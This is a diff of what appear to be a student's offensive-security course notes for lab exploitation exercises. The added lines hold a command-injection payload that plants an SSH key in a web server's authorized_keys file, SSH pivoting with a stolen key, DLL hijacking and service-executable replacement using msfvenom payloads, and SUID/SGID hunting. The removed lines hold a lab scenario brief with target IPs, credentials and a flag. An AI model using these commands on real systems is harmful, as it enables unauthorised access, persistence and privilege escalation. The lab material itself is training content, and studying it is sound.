@@ -44,6 +44,7 @@ directory traversal
 
 ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDGLL5Du5/UsLHJOQx8daDU7ChRLmemgc2DJY0jpuBnYphjDVU8t+pVSiCvp6Rvkf6X/OduA/rd/1Ha/r8ordhTgb+W3u+4KGpnQ/KkitAVODr9Lv1d4YXbO2onKxLPP1Asvl3E7N4U1+lXDnsWIVz6buftGCMqrSO86cGhiQTPdQu4wxGl/oXM4lvy+icXeBsEWqB1LUZUEYIzOhRUXyvpfaG0pT+5kCg2NKk/ae3iFEPZrxLWmlfqxKHdQ3uRCh/Q4b0TBLDjqt/QYJ2IMcJJHr5lUcGxtL1QEHY1aVsg9+nmrdbj08s1QHcmVGYBHF1c9PfnMIHPo3oNkKHLQUAQ2MmeASN6CxuBm1aK84NT3Ias5YLjuKmVxvinWR8gp/D3cf69eCg+EcLqB1PLc+l+O1HJz50lD+Ml7+8dPT98saUS0m+p3srVz6Djis6ijON/ktbtYnbSlRB5ohOFI6fKQ4azxLBWrzRYve89tNEgjgsyVbxztAGlLJMtoj3nzYW6x2DeuDc+3j5zDrARVnq21va2Ud4lPeByvgRcJvxJFoQyedLlf+52xC7TD8cALdvHV23iVI8msBnofsnTLr5RnU79k918Z3/dtoGs8JZC2AB0jfH5gGLEy2V0FfSyiH835p4UYiYGidZG9NnCUdM+862+BrCE2xo2sFvHAdT98w== student@lin-ops" > /home/billybob/.ssh/authorized_keys
 
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC9KNQjJachTmNyNDCO5thkYgQ8ZLhbqkLjFu4w/m4qfTg2Vg7BhTUuSvY13MjDdcH3qQpNi3kc9TUpBNb/R/REvUxH+wv05J8SRGJ+YDbU9XppCiKemX+6Oe6mywh+Ij/9u6GOO9Kwoy2u491DBLJSyuj7O+TD3KcBtQYsJlZ713lzkOoXSsNEzYQ7r9MtVr2LrQLPW2xw6V8MxPJzeM/w+TwIYsVxAluyX974kJ3uPPBl4qEpGkT3/Coei+nwBTwTYDTIhzNuR0iHD68OYULLuAYmbebwgkyCG8uLLP7Ptc++0RMrKJ0iED+fMK79v6whMjPAojXdy7OlZGVtHK4R6zMojABne2x8hgQjM9ln+B4GfSUryi/1H/Px8UHLAQG74cFvHa1cd/uSa99UHQcKyp+fLd0txy3JDkB8LWh3OB/3+Y/xaM7fWl/YqkMJj478LdlvjAvYZGq/iv4MvfekUTh6/z1+6V84rj57tUy8PIzJqiHWFlVCaYpQdMuye/wD2SsmMr1jXYJ58QOZiTV2uMJAv8gHLyhJBPMAeOd6f+cNYEVLk1XsVnzUS+J7WxSSE2ykX5P5vzkgE7YSyykeCefBm8+3aBa8Fdu9j/Hn0eC8+ePYuVfTrAifgr9E/feFQ9zv5K3eZZFGfk/Z04OYnLrwYgjKr8zXMkPgqRJYWw== student@lin-ops" > /var/www/.ssh/authorized_keys
 
 SQL Injection-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 USE
@@ -227,70 +228,6 @@ quit out of gdb
 
 
 
-
-
-
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Gorgas Exploit Development (GED)
-XX Mar 2023
-Start Time: 1300
-Duration: 4 hours
-
-Type of Operation: DEVOPS
-
-Objective:Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis, and stored them under /longTermStorage; however, you will be required to perform your exploits on the target systems. Maneuver through Donovian network, and successfully develop exploit to gain host access.
-
-Tools/Techniques: Exploit binaries on target systems using the tools below.
-
-    Python
-    OllyDBG or an equivelent graphical program
-        http://www.ollydbg.de/
-    GNU Debugger's(GDB) Python Exploit Development Assistance Module
-        https://github.com/longld/peda
-    MetaSploit
-        https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
-
-Scenario Credentials: FLAG = 3XPL01T5t@rt0F@ct1v1ty
-
-Prior Approvals: Gorgas Cyber Forces have been able to retrieve copies of the files for your analysis; however, you will be required to perform your exploits on the target systems. Exploit Donovian-Webserver, Donovian-Terminal, and Donovian-Manager hosts.
-
-Scheme of Maneuver:
->Jump Box
-->T1: 192.168.28.111
-->T2: 192.168.28.105
-
->Jump Box
-->donovian_grey_host
--->T3: 192.168.150.245
-
-Target Section:
-
-T1
-Hostname: Donovian_Webserver
-IP: 192.168.28.111
-OS: CentOS
-Creds: comrade :: StudentWebExploitPassword
-Last Known SSH Port: 2222
-Action: Exploit binary.
-
-T2
-Hostname: Donovian-Terminal
-IP: 192.168.28.105
-OS: unknown
-Creds: comrade :: StudentReconPassword
-Last Known SSH Port: 2222
-
-T3
-Hostname: unknown
-IP: 192.168.150.245
-OS: unknown
-Creds:unknown
-Last Known SSH Port: unknown
-PSP: Unknown
-Malware: Unknown
-Action: Exploit a network service on the machine
-
 ---------------------------------------------------------------------WINDOWS EXPLOITATION---------------------------------------------------------------------------------------------------------------------
 mostly same as linux steps
 
@@ -315,6 +252,94 @@ set lhost 0.0.0.0
 set lport <port you made in msfvenom>
 run multi/handler
 run winbuffer.py
+
+------------------------------------------------------------------- POST EXPLOITATION --------------------------------------------------------------------------------------------------------------------------
+
+
+ssh -i /home/student/stolenkey jane@1.2.3.4
+
+ssh -MS /tmp/s root@<ip address> <-L ip address>
+ssh -S /tmp/s x@x
+
+systemctl --type=service
+	linux display services command
+
+scp <source> <destination>
+	scp /path/to/file.txt student@<ip address>:/path/to/destination/file.txt
+
+	scp student@<ip address>:/path/to/destination/file.txt .
+
+
+-------------------------------------------------------------------------- WINDOWS EXPLOITATION ---------------------------------------------------------------------------------------------------------------
+	-- DLL HIJACKING --
+
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+services -> find service you want -> go to directory its stored in
+	can you write to the directory
+	can you rename the exe
+
+.\procmon.exe -accepteula
+     filters
+	process name contains <putty.exe>
+	path contrains .dll
+	result is NAME NOT FOUND
+	find .dll you want to use
+	drop payload in same directory dll is in as the same name
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+			running whoami command			places in text file		  dll found in process monitor
+
+scp student@<linux float>:/home/student/SSPICLI.dll C:\users\student\desktop
+
+put that payload into directory with executable
+.\sigcheck.exe -m -accepteula C:\Windows\System32\eventvwr.exe
+
+run executable
+
+	-- EXE REPLACEMENT --	
+
+find the service in services
+check path to executable
+rename the executable its looking for, then create your own to do what you want it to do
+
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
+			runs whoami command							renames it to what the service is looking for
+
+scp student@<linux float>:/home/student/putty.exe C:\users\student\desktop
+
+run new executable 
+
+
+
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "sucess failure"
+
+------------------------------------------------------------------------- LINUX EXPLOITATION ----------------------------------------------------------------------------------------------------------------
+
+SUID / SGID
+
+find / -type f -perm /4000 -ls 2>/dev/null
+	finds SUID only files
+find / -type f -perm /2000 -ls 2>/dev/null
+	finds SGID only files
+find / -type f -perm /6000 -ls 2>/dev/null
+	finds both SGID and SUID files
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
